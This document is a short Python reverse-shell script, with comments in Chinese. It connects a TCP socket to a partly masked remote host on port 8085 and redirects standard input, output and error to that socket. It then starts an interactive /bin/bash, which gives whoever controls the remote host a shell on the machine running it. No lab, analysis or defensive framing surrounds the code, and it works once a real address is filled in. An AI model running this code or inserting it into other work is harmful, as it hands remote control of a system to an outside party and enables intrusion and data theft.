import socket
import subprocess
import os

# 创建一个套接字对象
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接到远程服务器
s.connect(("4.X.X.X", 8085))

# 将标准输入、输出和错误重定向到套接字
os.dup2(s.fileno(), 0)  # 标准输入
os.dup2(s.fileno(), 1)  # 标准输出
os.dup2(s.fileno(), 2)  # 标准错误

# 执行一个Shell
subprocess.call(["/bin/bash", "-i"])
